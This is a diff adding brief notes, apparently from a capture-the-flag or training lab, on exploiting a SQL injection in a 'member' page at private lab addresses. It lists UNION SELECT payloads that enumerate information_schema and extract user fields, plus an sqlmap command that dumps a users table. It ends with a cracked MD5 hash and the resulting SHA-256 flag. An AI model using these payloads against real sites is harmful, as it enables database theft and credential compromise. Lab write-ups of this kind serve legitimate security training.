@@ -1,0 +1,11 @@
+- http://10.111.1.24/index.php?page=member
+
+
+- 0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES (Get tables name in the DB)
+- 0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS (find table columns in the DB for each table)
+- 1 or 1=1 UNION SELECT Commentaire, countersign FROM users
+- sqlmap -u "http://192.168.2.128/?page=member&id=1&Submit=Submit#" --dump -T users
+
+5ff9d0165b4f92b14994e5c685cdce28 -> decrypt md5 -> FortyTwo
+tolower(FortyTwo) -> sh256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
